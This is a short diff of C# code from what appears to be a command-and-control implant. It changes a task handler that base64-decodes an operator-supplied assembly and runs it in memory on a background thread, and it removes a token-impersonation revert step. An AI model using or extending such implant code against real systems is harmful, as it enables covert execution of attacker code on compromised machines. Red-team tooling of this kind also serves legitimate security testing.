@@ -38,30 +38,11 @@ namespace Agent
                 return;
             }
 
-            cae = new ConsoleApplicationExecutor(Misc.Base64DecodeToByteArray(args.asm), Misc.SplitCommandLine(args.arguments), job.task.id, messageManager);
-            cae.Execute();
-
-            //try
-            //{
-            //    if (args.path != null)
-            //    {
-            //        string output = Misc.ExecuteAssembly(args.path, args.parameters, job.task.id);
-            //        messageManager.Write(output, job.task.id, true);
-            //    }
-            //    else
-            //    {
-            //        messageManager.Write("Missing path parameter", job.task.id, true, "error");
-            //    }
-            //}
-            //catch (Exception e)
-            //{
-            //    messageManager.Write(e.ToString(), job.task.id, true, "error");
-            //}
-
-            if (job.task.token != 0)
+            Task.Run(() =>
             {
-                tokenManager.Revert();
-            }
+                cae = new ConsoleApplicationExecutor(Misc.Base64DecodeToByteArray(args.asm), Misc.SplitCommandLine(args.arguments), job.task.id, messageManager);
+                cae.Execute();
+            });
         }
     }
 }
